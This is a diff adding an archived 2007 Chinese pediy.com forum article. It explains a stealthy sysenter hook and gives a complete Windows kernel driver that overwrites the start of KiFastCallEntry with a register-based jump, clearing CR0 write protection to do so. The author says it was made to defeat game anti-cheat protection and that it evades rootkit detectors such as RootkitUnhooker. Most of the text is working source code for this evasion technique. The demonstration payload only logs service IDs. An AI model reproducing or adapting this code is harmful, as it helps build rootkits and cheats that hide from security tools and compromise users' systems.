@@ -1,0 +1,162 @@
+
+# 另一种 sysenter hook 方法(绕过绝大多数的 rootkit 检测工具的检测)
+
+> 原文：[`www.pediy.com/kssd/pediy09/pediy09-118.htm`](https://www.pediy.com/kssd/pediy09/pediy09-118.htm)
+
+> \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+> \*标题:【原创】另一种 sysenter hook 方法(绕过绝大多数的 rootkit 检测工具的检测) \*  
+> \*作者:堕落天才 \*  
+> \*日期:2007 年 4 月 14 号 \*  
+> \*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
+> 
+> 先废话,当初是为了绕开 NP 对 sysenter 保护而想出来的,后来发现连 `RootkitUnhooker` 都绕了.
+>
+> 什么是 sysenter hook 我也不罗唆了,一般的拦截方法就是通过 `rdmsr` `wrmsr` 两个指令把原来的 sysenter 地址改成自己的 sysenter 地址来实现的.这种方法使用方便,但检测也很容易.
+>
+> 这里介绍的另外一种方法不改变 sysenter 地址,而是通过直接在原来 sysenter 地址里面写跳转代码来实现的,这实际上跟一般的函数头 inline hook 一样.这样 rootkit 检测工具就不会认为 sysenter 已经改变(实际上也是没变).
+>
+> 一般的 rootkit 检测工具检测函数 inline hook 是通过检测长跳转指令 `0xE9` 的来判断跳转距离是不是超出函数所在的模块范围来确定的.但是实现跳转我们也可以借助寄存器或变量(用变量跳转需要涉及重定位问题,麻烦.所以一般用寄存器),这样跳转指令就不是 `0xE9` 了而是 `0xFF`,这个绝大多数 rootkit 检测工具是检测不到的(包括著名的 `RootkitUnhooker`,`VICE`).
+>
+> 由于我们已经改变了 `KiFastCall` 函数头,所以我们只能把原来的函数头代码放到另外一个地方执行(动态分配内存,当然如果不考虑兼容性硬编码也没问题),然后再跳转回来.这里使用了"三级跳",大概是这个样子.
+>
+> ```
+> sysenter->KiFastCall
+>             JMP -> MyKiFastCall(这里进行拦截或什么的)
+>                      JMP -> KiFastCall head code (这里执行原来 KiFastCall 函数头代码)
+>                               JMP -> KiFastCall + N(已经执行指令长度)
+> ```
+
+> ///////////////////////////////////////////////////////////////////////////////////////////////////  
+> //堕落天才  
+> //2007 年 4 月 14 日
+
+```c
+#include <ntddk.h>
+#include "OpCodeSize.h"
+
+ULONG uSysenter;          //sysenter 地址
+UCHAR uOrigSysenterHead[8]; //保存原来的八个字节函数头
+PUCHAR pMovedSysenterCode;  //把原来的 KiFastCall 函数头保存在这里
+ULONG i;                  //记录服务 ID
+
+__declspec(naked) void MyKiFastCallEntry(void)
+{
+  __asm{
+          pop  edi      //因为用到了 edi 来跳转 这里恢复
+         mov  i, eax   //得到服务 ID
+  }
+  __asm{  
+          pushad
+          push fs
+            push 0x30
+           pop fs
+  }
+  
+  DbgPrint("sysenter was hooked! Get service ID:%X",i); //证明自己存在
+  
+  __asm{
+            pop fs
+            popad      
+    jmp pMovedSysenterCode //第二跳,跳转到原来的函数头代码  
+  }
+  
+}
+//////////////////////////////////////////////////////
+
+VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
+{     
+  __asm{
+    cli
+            mov  eax,cr0
+    and  eax,not 10000h
+    mov  cr0,eax
+  }
+  
+  memcpy((PVOID)uSysenter,uOrigSysenterHead,8);//把原来函数头的八个字节恢复
+  
+  __asm{
+    mov  eax,cr0
+           or   eax,10000h
+    mov  cr0,eax
+    sti
+  }
+  ExFreePool(pMovedSysenterCode); // 释放分配的内存
+  DbgPrint("Unload sysenterHook");
+}
+//////////////////////////////////////////////////////
+
+VOID HookSysenter()
+{
+  UCHAR  cHookCode[8] = { 0x57,         //push edi       第一跳,从 KiFastCall 跳到 MyKiFastCallEntry.并绕过 rootkit 检测工具检测
+                         0xBF,0,0,0,0,  //mov  edi,0000
+                         0xFF,0xE7};     //jmp  edi
+  
+  UCHAR  JmpCode[]={0xE9,0,0,0,0};      //jmp 0000 第三跳,从 KiFastCall 函数头代码跳转到原来 KiFastCall+N
+  
+  int    nCopyLen = 0;
+  int    nPos = 0;
+  
+  __asm{
+         mov ecx,0x176
+           rdmsr
+    mov uSysenter,eax  //得到 KiFastCallEntry 地址
+  }
+  DbgPrint("sysenter:0x%08X",uSysenter);
+  
+  nPos = uSysenter;
+   while(nCopyLen<8){ //我们要改写的函数头至少需要 8 字节 这里计算实际需要 COPY 的代码长度 因为我们不能把一条完整的指令打断
+    nCopyLen += GetOpCodeSize((PVOID)nPos);  //参考 1
+    nPos = uSysenter + nCopyLen;
+  }
+  
+  DbgPrint("copy code lenght:%d",nCopyLen);
+  
+  pMovedSysenterCode = ExAllocatePool(NonPagedPool,20);
+  
+  memcpy(uOrigSysenterHead,(PVOID)uSysenter,8);//备份原来 8 字节代码
+  
+  *((ULONG*)(JmpCode+1)) = (uSysenter + nCopyLen) - ((ULONG)pMovedSysenterCode + nCopyLen)- 5;//计算跳转地址
+  
+  memcpy(pMovedSysenterCode,(PVOID)uSysenter,nCopyLen); //把原来的函数头放到新分配的内存
+  memcpy((PVOID)(pMovedSysenterCode + nCopyLen),JmpCode,5); //把跳转代码 COPY 上去
+  
+  *((ULONG*)(cHookCode+2)) = (ULONG)MyKiFastCallEntry; //HOOK 地址
+  
+  DbgPrint("Saved sysenter code:0x%08X",pMovedSysenterCode);
+  DbgPrint("MyKiFastCallEntry:0x%08X",MyKiFastCallEntry);
+  
+  __asm{
+    cli
+           mov  eax,cr0
+    and  eax,not 10000h
+    mov  cr0,eax
+  }
+  
+  memcpy((PVOID)uSysenter,cHookCode,8);//把改写原来函数头
+  
+  __asm{
+    mov  eax,cr0
+           or   eax,10000h
+    mov  cr0,eax
+    sti
+  }
+  
+}
+
+NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,PUNICODE_STRING RegistryPath)
+{
+  
+  DbgPrint("Welcome to sysenterhook.sys");
+  DriverObject->DriverUnload = OnUnload;
+  HookSysenter();
+  return STATUS_SUCCESS;
+}     
+///////////////////////////////////////////////////////////////////////////////////////////////// 
+```
+
+> 以上代码在 XP SP2 中文 + `RootkitUnhooker` 下测试通过
+>
+> 同理 IDT hook 也可以用这种方法实现,HOOK 的实质是改变程序流程,无论在哪里改变
+
+> 参考 1, 海风月影[,【分享】西裤哥的 Hook Api Lib 0.2 For C ](http://bbs.pediy.com/showthread.php?t=41387)
+
